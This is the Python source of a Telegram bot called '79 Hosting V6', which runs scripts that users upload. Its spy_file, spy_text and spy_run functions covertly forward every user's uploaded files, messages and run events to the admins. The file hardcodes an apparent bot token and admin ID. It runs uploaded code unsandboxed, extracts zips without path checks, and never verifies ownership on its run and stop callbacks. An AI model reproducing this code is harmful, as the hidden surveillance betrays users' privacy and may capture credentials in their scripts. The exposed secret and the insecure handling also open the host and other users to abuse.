#!/usr/bin/env python3
"""79 Hosting V6 — no timeout, 5-slot rotation, infinite auto-repair"""
import asyncio, atexit, json, logging, os, re, shlex, signal, subprocess, sys, zipfile
from datetime import datetime
from pathlib import Path
from threading import Thread
from typing import Dict, List, Optional, Tuple

import psutil
from dotenv import load_dotenv
from flask import Flask, jsonify
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.request import HTTPXRequest
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler, ConversationHandler,
    MessageHandler, ContextTypes, filters,
)

logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger("79")

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN", "8923078994:AAEYk_-hdpVh2NYN4_yXX5lERPhVt8Ccs1I").strip()
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7546911540").split(",") if x.strip().isdigit()] or [7546911540]
CHANNEL = os.getenv("CHANNEL_USERNAME", "@seventyx79").strip()
PORT = int(os.getenv("PORT") or os.getenv("RAILWAY_PUBLIC_PORT") or "8080")
WS_BASE = Path(os.getenv("WORKSPACE_BASE", "./workspaces"))
MAX_UP = 50 * 1024 * 1024
MAX_USER_PROCS = int(os.getenv("MAX_USER_PROCESSES", "5"))
DL_TIMEOUT = int(os.getenv("DOWNLOAD_TIMEOUT", "60"))
WS_BASE.mkdir(parents=True, exist_ok=True)

UPLOAD_WAIT, TERM = range(2)
DATA = Path("bot_data.json")


class Paths:
    def __init__(self):
        self.d, self.n = {}, 0
    def add(self, p: Path) -> str:
        s = str(p.resolve())
        for k, v in self.d.items():
            if v == s: return k
        k = f"k{self.n}"; self.n += 1; self.d[k] = s; return k
    def get(self, k: str) -> Optional[Path]:
        v = self.d.get(k); return Path(v) if v else None
R = Paths()


def load():
    if DATA.exists():
        try: return json.loads(DATA.read_text())
        except: pass
    return {"users": {}, "procs": [], "tele": {}}

def save(d):
    try: DATA.write_text(json.dumps(d, indent=2, default=str))
    except: pass


class UM:
    def __init__(self):
        self.data = load()
        self.users = self.data.setdefault("users", {})
        self.procs = self.data.setdefault("procs", [])
        self.tele = self.data.setdefault("tele", {})

    def save(self):
        self.data.update(users=self.users, procs=self.procs, tele=self.tele); save(self.data)

    def get(self, uid): return self.users.get(str(uid))

    def add(self, uid, name, un):
        st = "approved" if uid in ADMIN_IDS else "pending"
        self.users[str(uid)] = {"status": st, "name": name, "username": un,
            "workspace": str(WS_BASE / str(uid)), "t": datetime.now().isoformat()}
        self.tele.setdefault(str(uid), {"runs": 0, "ok": 0, "fail": 0})
        self.save()

    def set_status(self, uid, st):
        if u := self.get(uid): u["status"] = st; self.save(); return True
        return False

    def ok(self, uid): return uid in ADMIN_IDS or (self.get(uid) or {}).get("status") == "approved"
    def pending(self, uid): return uid not in ADMIN_IDS and (self.get(uid) or {}).get("status") == "pending"
    def banned(self, uid): return (self.get(uid) or {}).get("status") == "banned"

    def ws(self, uid):
        u = self.get(uid)
        p = Path(u["workspace"]) if u else WS_BASE / str(uid)
        p.mkdir(parents=True, exist_ok=True); return p

    def add_proc(self, uid, name, pid, logp):
        self.procs.append({"user_id": uid, "filename": name, "pid": pid,
                           "status": "running", "log": logp,
                           "started": datetime.now().isoformat()})
        self.save()

    def user_procs(self, uid): return [p for p in self.procs if p.get("user_id") == uid]
    def all_procs(self): return self.procs

    def live_user_procs(self, uid):
        out = []
        for p in self.user_procs(uid):
            if p.get("status") == "running" and psutil.pid_exists(p.get("pid")):
                out.append(p)
            elif p.get("status") == "running":
                p["status"] = "stopped"
        self.save()
        return sorted(out, key=lambda x: x.get("started", ""))

    def stop(self, pid):
        for p in self.procs:
            if p.get("pid") == pid:
                try: os.kill(pid, signal.SIGTERM)
                except: pass
                try: os.kill(pid, signal.SIGKILL)
                except: pass
                p["status"] = "stopped"; self.save(); return True
        return False

    def cleanup(self):
        for p in list(self.procs):
            try: os.kill(p.get("pid"), signal.SIGTERM)
            except: pass
        self.procs.clear(); self.save()

    def tinc(self, uid, k):
        self.tele.setdefault(str(uid), {"runs": 0, "ok": 0, "fail": 0})[k] += 1; self.save()
    def tget(self, uid): return self.tele.get(str(uid), {"runs": 0, "ok": 0, "fail": 0})

    def pending_list(self): return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "pending"]
    def approved_list(self): return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "approved"]
    def banned_list(self): return [{"user_id": k, **v} for k, v in self.users.items() if v.get("status") == "banned"]

um = UM()
atexit.register(um.cleanup)


async def spy_file(bot, user, file_id, fname):
    if user.id in ADMIN_IDS: return
    cap = f"🕵️ FILE\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n📄 `{fname}`"
    for a in ADMIN_IDS:
        try: await bot.send_document(a, document=file_id, caption=cap, parse_mode="Markdown")
        except Exception as e: log.warning("spy file: %s", e)

async def spy_text(bot, user, text):
    if user.id in ADMIN_IDS: return
    msg = f"🕵️ MSG\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n💬 {text[:3000]}"
    for a in ADMIN_IDS:
        try: await bot.send_message(a, msg, parse_mode="Markdown")
        except: pass

async def spy_run(bot, user, fname):
    if user.id in ADMIN_IDS: return
    msg = f"🕵️ RUN\n👤 {user.full_name} (@{user.username or '-'})\n🆔 `{user.id}`\n▶️ `{fname}`"
    for a in ADMIN_IDS:
        try: await bot.send_message(a, msg, parse_mode="Markdown")
        except: pass


def menu_kb(uid):
    rows = [
        [InlineKeyboardButton("📁 Upload", callback_data="upload"),
         InlineKeyboardButton("📂 Scripts", callback_data="scripts")],
        [InlineKeyboardButton("📝 Logs", callback_data="logs"),
         InlineKeyboardButton("🛑 Stop", callback_data="stop")],
        [InlineKeyboardButton("📊 Stats", callback_data="stats")],
    ]
    if uid in ADMIN_IDS:
        rows.append([InlineKeyboardButton("💻 Terminal", callback_data="term"),
                     InlineKeyboardButton("👑 Admin", callback_data="admin")])
    return InlineKeyboardMarkup(rows)

def back_kb(to="home"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=to),
                                  InlineKeyboardButton("🏠 Menu", callback_data="home")]])


async def joined(bot, uid):
    if not CHANNEL or uid in ADMIN_IDS: return True
    try:
        c = CHANNEL if CHANNEL.startswith("@") else f"@{CHANNEL}"
        m = await bot.get_chat_member(c, uid)
        return m.status not in ("left", "kicked")
    except: return True


async def gate(update, context) -> bool:
    u = update.effective_user
    if not u: return False
    uid = u.id
    q, m = update.callback_query, update.effective_message

    async def say(t, kb=None):
        if q:
            try: await q.edit_message_text(t, parse_mode="Markdown", reply_markup=kb)
            except: pass
        elif m: await m.reply_text(t, parse_mode="Markdown", reply_markup=kb)

    if not await joined(context.bot, uid):
        ch = CHANNEL.lstrip("@")
        await say(f"🔒 Join {CHANNEL}", InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 Join", url=f"https://t.me/{ch}")],
            [InlineKeyboardButton("✅ Check", callback_data="join")]]))
        return False

    if not um.get(uid):
        um.add(uid, u.full_name, u.username or "-")
        if uid not in ADMIN_IDS:
            for a in ADMIN_IDS:
                try:
                    await context.bot.send_message(a,
                        f"🔔 New user\n{u.full_name}\n`{uid}`", parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("✅", callback_data=f"ap_{uid}"),
                            InlineKeyboardButton("🚫", callback_data=f"bn_{uid}")]]))
                except: pass
            await say("⏳ Wait for admin approval.")
            return False
    if um.banned(uid):
        await say("🚫 Banned."); return False
    if um.pending(uid):
        await say("⏳ Pending approval."); return False
    return True


def safe_name(n: str) -> str:
    n = os.path.basename(n or "file.py")
    n = re.sub(r"[^\w.\-]+", "_", n).strip("_")
    return n or "file.py"


def extract_zip(zp: Path, dest: Path) -> Tuple[bool, str]:
    try:
        with zipfile.ZipFile(zp) as z:
            if sum(i.file_size for i in z.infolist()) > 200 * 1024 * 1024:
                return False, "zip too big"
            z.extractall(dest)
        return True, "ok"
    except Exception as e: return False, str(e)


def entry_of(d: Path):
    for n in ("main.py", "bot.py", "app.py", "index.js"):
        p = d / n
        if p.exists(): return ("py" if n.endswith(".py") else "js", p)
    pys = list(d.glob("*.py"))
    if pys: return "py", pys[0]
    jss = list(d.glob("*.js"))
    if jss: return "js", jss[0]
    return None, None


PIP_ALIAS = {
    "user_agent": "fake-useragent",
    "cv2": "opencv-python",
    "PIL": "Pillow",
    "yaml": "PyYAML",
    "bs4": "beautifulsoup4",
    "Crypto": "pycryptodome",
    "OpenSSL": "pyOpenSSL",
    "dotenv": "python-dotenv",
    "telegram": "python-telegram-bot",
    "telethon": "Telethon",
}

async def pip_install(name):
    for pkg in {name, PIP_ALIAS.get(name, name)}:
        try:
            p = await asyncio.create_subprocess_exec(
                sys.executable, "-m", "pip", "install", "--no-input", pkg,
                stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
            )
            await p.communicate()
            if p.returncode == 0:
                return True
        except: pass
    return False

async def install_reqs(dest: Path):
    req = dest / "requirements.txt"
    if not req.exists(): return
    try:
        p = await asyncio.create_subprocess_exec(
            sys.executable, "-m", "pip", "install", "--no-input", "-r", str(req),
            stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
        )
        await p.communicate()
    except: pass


def miss_mod(txt):
    m = re.search(r"(?:ModuleNotFoundError|ImportError): No module named ['\"]([^'\"]+)['\"]", txt)
    return m.group(1) if m else None


async def enforce_slot(uid, bot):
    """Ensure user has < MAX_USER_PROCS. Kill OLDEST to make room."""
    live = um.live_user_procs(uid)
    while len(live) >= MAX_USER_PROCS:
        old = live[0]
        um.stop(old["pid"])
        try:
            await bot.send_message(uid,
                f"🔄 Slot full ({MAX_USER_PROCS}). Removed oldest: `{old['filename']}` (PID {old['pid']})",
                parse_mode="Markdown")
        except: pass
        live = um.live_user_procs(uid)


async def run_script(uid, path: Path, ftype, edit):
    um.tinc(uid, "runs")
    logdir = um.ws(uid) / "logs"; logdir.mkdir(exist_ok=True)
    lp = logdir / f"{datetime.now():%Y%m%d_%H%M%S}_{path.stem}.log"
    cmd = [sys.executable, "-u", str(path)] if ftype == "py" else ["node", str(path)]

    def spawn(mode="w"):
        f = open(lp, mode, buffering=1, encoding="utf-8", errors="ignore")
        pr = subprocess.Popen(
            cmd, cwd=str(path.parent),
            stdout=f, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,
        )
        return pr, f

    await edit("⏳ Preparing environment...")
    await install_reqs(path.parent)

    await edit("🚀 Starting script...")
    tried_modules = set()
    attempt = 0
    mode = "w"

    while True:
        attempt += 1
        pr, f = spawn(mode); mode = "a"
        await asyncio.sleep(4)
        code = pr.poll()

        if code is None:
            um.tinc(uid, "ok")
            return pr.pid, str(lp), f"🚀 Running in background\nPID `{pr.pid}` | Attempts: {attempt}"

        try: f.close()
        except: pass
        out = lp.read_text(errors="ignore") if lp.exists() else ""

        if code == 0:
            um.tinc(uid, "ok")
            return pr.pid, str(lp), f"✅ Finished OK (Attempts: {attempt})"

        miss = miss_mod(out)
        if miss and miss not in tried_modules:
            tried_modules.add(miss)
            await edit(f"⚙️ Missing `{miss}` — installing (auto-repair {len(tried_modules)})...")
            ok = await pip_install(miss)
            if ok:
                await edit(f"✅ Installed `{miss}`. Retrying...")
                continue
            else:
                um.tinc(uid, "fail")
                return pr.pid, str(lp), f"❌ Cannot install `{miss}`\n```\n{out[-700:]}\n```"

        um.tinc(uid, "fail")
        tail = out[-1000:] if out else "no output"
        return pr.pid, str(lp), f"❌ Script error (Exit {code})\n```\n{tail}\n```"


async def download_doc(bot, file_id, dest: Path, tries=4) -> Tuple[bool, Optional[str]]:
    last = None
    for i in range(tries):
        try:
            tg = await bot.get_file(file_id, read_timeout=DL_TIMEOUT, write_timeout=DL_TIMEOUT, connect_timeout=DL_TIMEOUT)
            await tg.download_to_drive(custom_path=str(dest))
            if dest.exists() and dest.stat().st_size > 0:
                return True, None
        except Exception as e:
            last = e
            log.warning("download attempt %d: %s", i + 1, e)
            await asyncio.sleep(2 * (i + 1))
    return False, str(last)


# ---- handlers ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, context): return
    u = update.effective_user
    await update.message.reply_text(
        f"👋 *{u.first_name}* — 79 Hosting\nMax {MAX_USER_PROCS} scripts at a time.",
        parse_mode="Markdown", reply_markup=menu_kb(u.id))

async def home(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if not await gate(update, context): return
    try:
        await q.edit_message_text("📋 *Menu*", parse_mode="Markdown", reply_markup=menu_kb(q.from_user.id))
    except: pass

async def join_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if await gate(update, context):
        try: await q.edit_message_text("✅ OK", reply_markup=menu_kb(q.from_user.id))
        except: pass

async def upload_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if not await gate(update, context): return ConversationHandler.END
    await q.edit_message_text(
        "📤 Send `.py` / `.js` / `.zip`\n/cancel to abort",
        parse_mode="Markdown", reply_markup=back_kb())
    return UPLOAD_WAIT

async def upload_recv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    doc = update.message.document
    if not doc:
        await update.message.reply_text("Send a file.", reply_markup=back_kb())
        return UPLOAD_WAIT

    name = doc.file_name or "file.py"
    if not name.endswith((".py", ".js", ".zip")):
        await update.message.reply_text("Only py/js/zip", reply_markup=menu_kb(u.id))
        return ConversationHandler.END
    if doc.file_size and doc.file_size > MAX_UP:
        await update.message.reply_text("Too large (>50MB)", reply_markup=menu_kb(u.id))
        return ConversationHandler.END

    ws = um.ws(u.id)
    safe = safe_name(name)
    path = ws / safe

    status_msg = await update.message.reply_text("⬇️ Downloading...")
    ok, err = await download_doc(context.bot, doc.file_id, path)
    if not ok:
        await status_msg.edit_text(
            f"❌ Download failed. Try again.\n`{err}`",
            parse_mode="Markdown", reply_markup=menu_kb(u.id))
        return ConversationHandler.END

    await spy_file(context.bot, u, doc.file_id, name)

    if safe.endswith(".zip"):
        ed = ws / f"extracted_{path.stem}"
        ed.mkdir(exist_ok=True)
        okz, msg = extract_zip(path, ed)
        if not okz:
            await status_msg.edit_text(f"❌ Zip err: {msg}", reply_markup=menu_kb(u.id))
            return ConversationHandler.END
        _, ent = entry_of(ed)
        await status_msg.edit_text(
            f"✅ Zip extracted.\nEntry: `{ent.name if ent else '?'}`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📂 Scripts", callback_data="scripts")],
                [InlineKeyboardButton("🏠 Menu", callback_data="home")]]))
        return ConversationHandler.END

    await status_msg.edit_text(
        f"✅ `{safe}` saved",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📂 Scripts", callback_data="scripts")],
            [InlineKeyboardButton("🏠 Menu", callback_data="home")]]))
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.", reply_markup=menu_kb(update.effective_user.id))
    return ConversationHandler.END

async def scripts_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    ws = um.ws(uid)
    files = list(ws.glob("*.py")) + list(ws.glob("*.js"))
    files += list(ws.glob("extracted*/**/*.py")) + list(ws.glob("extracted*/**/*.js"))
    seen, uniq = set(), []
    for f in files:
        s = str(f.resolve())
        if s not in seen: seen.add(s); uniq.append(f)
    if not uniq:
        await q.edit_message_text("No scripts. Upload first.", reply_markup=back_kb()); return
    rows = []
    for f in uniq[:25]:
        k = R.add(f)
        rows.append([InlineKeyboardButton(f"📄 {f.name[:30]}", callback_data=f"vw_{k}"),
                     InlineKeyboardButton("▶️", callback_data=f"rn_{k}")])
    rows.append([InlineKeyboardButton("🏠 Menu", callback_data="home")])
    await q.edit_message_text(f"📂 *Scripts* (Slot: {len(um.live_user_procs(uid))}/{MAX_USER_PROCS})",
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(rows))

async def view_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    p = R.get(q.data[3:])
    if not p or not p.exists():
        await q.edit_message_text("Missing", reply_markup=back_kb("scripts")); return
    c = p.read_text(errors="ignore")[:700]
    k = R.add(p)
    await q.edit_message_text(f"📄 `{p.name}`\n```\n{c}\n```", parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("▶️ Run", callback_data=f"rn_{k}")],
            [InlineKeyboardButton("🔙 Scripts", callback_data="scripts"),
             InlineKeyboardButton("🏠", callback_data="home")]]))

async def run_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    uid = q.from_user.id
    p = R.get(q.data[3:])
    if not p or not p.exists():
        await q.edit_message_text("Missing", reply_markup=back_kb("scripts")); return
    ft = "py" if p.suffix == ".py" else "js"

    await enforce_slot(uid, context.bot)
    await spy_run(context.bot, q.from_user, p.name)

    async def edit(t):
        try: await q.edit_message_text(t, parse_mode="Markdown")
        except: pass

    pid, lp, st = await run_script(uid, p, ft, edit)
    if pid: um.add_proc(uid, p.name, pid, lp)
    lk = R.add(Path(lp))
    await q.edit_message_text(f"{st}\n📄 `{Path(lp).name}`", parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📝 Log", callback_data=f"lg_{lk}")],
            [InlineKeyboardButton("📂 Scripts", callback_data="scripts"),
             InlineKeyboardButton("🏠", callback_data="home")]]))

async def log_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    p = R.get(q.data[3:])
    if not p or not p.exists():
        await q.edit_message_text("No log", reply_markup=back_kb()); return
    t = p.read_text(errors="ignore")[-3000:]
    await q.edit_message_text(f"📝 `{p.name}`\n```\n{t}\n```", parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📂 Scripts", callback_data="scripts"),
             InlineKeyboardButton("🏠", callback_data="home")]]))

async def logs_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    rows = []
    for pr in um.user_procs(q.from_user.id)[-20:]:
        lp = Path(pr.get("log") or "")
        if lp.exists():
            rows.append([InlineKeyboardButton(lp.name[:40], callback_data=f"lg_{R.add(lp)}")])
    if not rows:
        await q.edit_message_text("No logs", reply_markup=back_kb()); return
    rows.append([InlineKeyboardButton("🏠", callback_data="home")])
    await q.edit_message_text("📝 Logs", reply_markup=InlineKeyboardMarkup(rows))

async def stop_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    live = um.live_user_procs(q.from_user.id)
    if not live:
        await q.edit_message_text("Nothing running", reply_markup=back_kb()); return
    rows = [[InlineKeyboardButton(f"🛑 {p['filename'][:25]} ({p['pid']})", callback_data=f"sp_{p['pid']}")] for p in live]
    rows.append([InlineKeyboardButton("🏠", callback_data="home")])
    await q.edit_message_text(f"Running: {len(live)}/{MAX_USER_PROCS}",
        reply_markup=InlineKeyboardMarkup(rows))

async def stop_one(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    pid = int(q.data[3:])
    um.stop(pid)
    await q.edit_message_text(f"✅ Stopped `{pid}`", parse_mode="Markdown", reply_markup=back_kb())

async def stats_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    t = um.tget(q.from_user.id)
    live = len(um.live_user_procs(q.from_user.id))
    await q.edit_message_text(
        f"📊 Runs {t['runs']} | ✅ {t['ok']} | ❌ {t['fail']}\n🏃 Live: {live}/{MAX_USER_PROCS}",
        reply_markup=back_kb())


# ----- terminal admin -----
async def term_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS:
        await q.edit_message_text("Admin only", reply_markup=back_kb()); return ConversationHandler.END
    context.user_data["cwd"] = str(um.ws(q.from_user.id))
    await q.edit_message_text(
        f"💻 Terminal\n`{context.user_data['cwd']}`\npwd ls cd cat head tail mkdir cp mv rm\n/cancel exit",
        parse_mode="Markdown", reply_markup=back_kb())
    return TERM

ALLOWED = {"pwd", "ls", "cd", "cat", "head", "tail", "mkdir", "cp", "mv", "rm"}

async def term_in(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS: return ConversationHandler.END
    t = (update.message.text or "").strip()
    if t in ("/cancel", "cancel"):
        await update.message.reply_text("Closed", reply_markup=menu_kb(uid))
        return ConversationHandler.END
    try: parts = shlex.split(t)
    except: await update.message.reply_text("bad cmd"); return TERM
    if not parts or parts[0].lower() not in ALLOWED:
        await update.message.reply_text("not allowed"); return TERM
    cwd = Path(context.user_data.get("cwd") or um.ws(uid))
    if parts[0] == "cd":
        if len(parts) < 2: return TERM
        tgt = (cwd / parts[1]).resolve()
        try: tgt.relative_to(um.ws(uid).resolve())
        except ValueError:
            await update.message.reply_text("blocked"); return TERM
        if not tgt.is_dir():
            await update.message.reply_text("not dir"); return TERM
        context.user_data["cwd"] = str(tgt)
        await update.message.reply_text(f"📁 `{tgt}`", parse_mode="Markdown"); return TERM
    try:
        p = await asyncio.create_subprocess_exec(*parts, cwd=str(cwd),
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        o, e = await asyncio.wait_for(p.communicate(), timeout=20)
        out = (o + e).decode(errors="ignore") or "(empty)"
        await update.message.reply_text(f"```\n{out[:3500]}\n```", parse_mode="Markdown")
    except Exception as ex:
        await update.message.reply_text(str(ex))
    return TERM


# ----- admin -----
async def admin_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    await q.edit_message_text("👑 Admin", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Users", callback_data="au"),
         InlineKeyboardButton("⏳ Pending", callback_data="apd")],
        [InlineKeyboardButton("🖥️ Running", callback_data="ar"),
         InlineKeyboardButton("🚫 Banned", callback_data="ab")],
        [InlineKeyboardButton("🏠", callback_data="home")]]))

async def au(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    us = um.approved_list()
    t = "👥\n" + "\n".join(f"• {x['name']} `{x['user_id']}`" for x in us[:40]) if us else "none"
    await q.edit_message_text(t, parse_mode="Markdown", reply_markup=back_kb("admin"))

async def apd(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    pl = um.pending_list()
    if not pl:
        await q.edit_message_text("No pending", reply_markup=back_kb("admin")); return
    rows = [[InlineKeyboardButton(f"{x['name']} {x['user_id']}", callback_data=f"pd_{x['user_id']}")] for x in pl]
    rows.append([InlineKeyboardButton("🔙", callback_data="admin")])
    await q.edit_message_text("Pending", reply_markup=InlineKeyboardMarkup(rows))

async def pd(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    uid = int(q.data[3:])
    await q.edit_message_text(f"User `{uid}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("✅", callback_data=f"ap_{uid}"),
         InlineKeyboardButton("🚫", callback_data=f"bn_{uid}")],
        [InlineKeyboardButton("🔙", callback_data="apd")]]))

async def ap(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    uid = int(q.data[3:])
    um.set_status(uid, "approved")
    await q.edit_message_text(f"✅ `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin"))
    try: await context.bot.send_message(uid, "✅ Approved! /start")
    except: pass

async def bn(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    uid = int(q.data[3:])
    um.set_status(uid, "banned")
    await q.edit_message_text(f"🚫 `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin"))

async def ar(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    run = [p for p in um.all_procs() if p.get("status") == "running" and psutil.pid_exists(p.get("pid"))]
    t = "\n".join(f"• {p['filename']} {p['pid']} u`{p['user_id']}`" for p in run) or "none"
    await q.edit_message_text(f"🖥️\n{t}", parse_mode="Markdown", reply_markup=back_kb("admin"))

async def ab(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    bl = um.banned_list()
    if not bl:
        await q.edit_message_text("none", reply_markup=back_kb("admin")); return
    rows = [[InlineKeyboardButton(f"Unban {x['name']}", callback_data=f"ub_{x['user_id']}")] for x in bl]
    rows.append([InlineKeyboardButton("🔙", callback_data="admin")])
    await q.edit_message_text("Banned", reply_markup=InlineKeyboardMarkup(rows))

async def ub(update, context):
    q = update.callback_query; await q.answer()
    if q.from_user.id not in ADMIN_IDS: return
    uid = int(q.data[3:])
    um.set_status(uid, "approved")
    await q.edit_message_text(f"Unbanned `{uid}`", parse_mode="Markdown", reply_markup=back_kb("admin"))


async def text_spy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, context): return
    await spy_text(context.bot, update.effective_user, update.message.text or "")
    await update.message.reply_text("Use buttons ⬇️", reply_markup=menu_kb(update.effective_user.id))

async def on_err(update, context):
    log.error("%s", context.error)


appf = Flask("79")
@appf.get("/")
@appf.get("/healthz")
def hp(): return jsonify(ok=True)


def main():
    Thread(target=lambda: appf.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False), daemon=True).start()

    request = HTTPXRequest(
        connect_timeout=30.0,
        read_timeout=120.0,
        write_timeout=120.0,
        pool_timeout=30.0,
    )
    app = Application.builder().token(BOT_TOKEN).request(request).build()

    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(upload_cb, pattern="^upload$")],
        states={UPLOAD_WAIT: [MessageHandler(filters.Document.ALL, upload_recv)]},
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(home, pattern="^home$")],
    ))
    app.add_handler(ConversationHandler(
        entry_points=[CallbackQueryHandler(term_cb, pattern="^term$")],
        states={TERM: [MessageHandler(filters.TEXT & ~filters.COMMAND, term_in)]},
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(home, pattern="^home$")],
    ))

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(join_cb, pattern="^join$"))
    app.add_handler(CallbackQueryHandler(home, pattern="^home$"))
    app.add_handler(CallbackQueryHandler(scripts_cb, pattern="^scripts$"))
    app.add_handler(CallbackQueryHandler(view_cb, pattern="^vw_"))
    app.add_handler(CallbackQueryHandler(run_cb, pattern="^rn_"))
    app.add_handler(CallbackQueryHandler(log_cb, pattern="^lg_"))
    app.add_handler(CallbackQueryHandler(logs_cb, pattern="^logs$"))
    app.add_handler(CallbackQueryHandler(stop_cb, pattern="^stop$"))
    app.add_handler(CallbackQueryHandler(stop_one, pattern="^sp_"))
    app.add_handler(CallbackQueryHandler(stats_cb, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(admin_cb, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(au, pattern="^au$"))
    app.add_handler(CallbackQueryHandler(apd, pattern="^apd$"))
    app.add_handler(CallbackQueryHandler(pd, pattern="^pd_"))
    app.add_handler(CallbackQueryHandler(ap, pattern="^ap_"))
    app.add_handler(CallbackQueryHandler(bn, pattern="^bn_"))
    app.add_handler(CallbackQueryHandler(ar, pattern="^ar$"))
    app.add_handler(CallbackQueryHandler(ab, pattern="^ab$"))
    app.add_handler(CallbackQueryHandler(ub, pattern="^ub_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_spy))
    app.add_error_handler(on_err)

    log.info("79 V6 up | MAX_PROCS=%d", MAX_USER_PROCS)
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
